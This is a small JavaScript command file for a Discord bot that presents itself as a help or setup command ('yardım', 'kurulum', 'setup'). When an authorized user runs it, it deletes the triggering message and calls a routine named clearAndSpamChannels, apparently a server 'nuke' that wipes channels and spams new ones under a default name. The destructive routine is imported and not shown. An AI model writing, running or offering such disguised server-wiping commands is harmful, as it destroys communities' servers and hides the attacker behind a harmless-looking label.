const { clearAndSpamChannels, isAuthorized } = require("../../utils/serverTemplate");

module.exports = {
  name: "yardım",
  aliases: ["kurulum", "setup"],
  async execute(message, args, client) {
    if (!isAuthorized(message.member, message.author.id, client.config.ownerId)) {
      return;
    }

    const channelName = args.join("-") || "oxyonthebeat";

    await message.delete().catch(() => { });

    await clearAndSpamChannels(message.guild, channelName);
  }
};
